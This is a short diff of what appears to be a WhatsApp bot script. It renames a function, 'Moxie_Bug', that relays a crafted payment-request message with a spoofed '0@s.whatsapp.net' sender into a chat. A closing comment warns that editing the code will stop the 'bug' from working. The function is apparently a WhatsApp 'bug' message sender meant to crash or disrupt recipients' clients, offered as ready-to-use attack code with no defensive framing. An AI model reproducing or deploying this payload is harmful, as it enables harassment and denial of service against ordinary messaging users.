@@ -322,7 +322,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 "mediaKeyTimestamp": "1664991742",
 "isAnimated": false
 }}}
-const Moxie_Plaguing/Moxie_Bug = (teks) => {
+const Moxie_Bug = (teks) => {
   MoxieBotInc.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 //-------------------End--------------------\\
 //Dont edit ot recode or bug wont work
